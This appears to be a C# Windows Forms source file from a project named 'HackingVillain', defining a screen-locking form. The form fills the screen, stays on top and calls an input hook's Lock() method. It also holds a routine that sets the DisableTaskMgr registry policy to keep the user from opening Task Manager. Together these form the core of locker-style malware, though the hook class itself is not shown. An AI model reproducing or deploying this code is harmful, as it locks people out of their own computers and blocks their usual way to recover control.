using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace HackingVillain
{
    public partial class LockForm : Form
    {
        Hooker _hook;
        public LockForm(Hooker hook)
        {
            InitializeComponent();
            _hook = hook;

            this.Size = new Size(10000, 10000);
            this.TopMost = true;
        }

        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);

            _hook.Lock();

        }

        /// <summary>
        /// 끝나는거
        /// </summary>
        public void Fuck()
        {
            _hook.UnLock();
            this.Hide();
        }

        void TaskManager(bool enabled)
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (enabled && objRegistryKey.GetValue("DisableTaskMgr") != null)
                objRegistryKey.DeleteValue("DisableTaskMgr");
            else
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }
    }
}
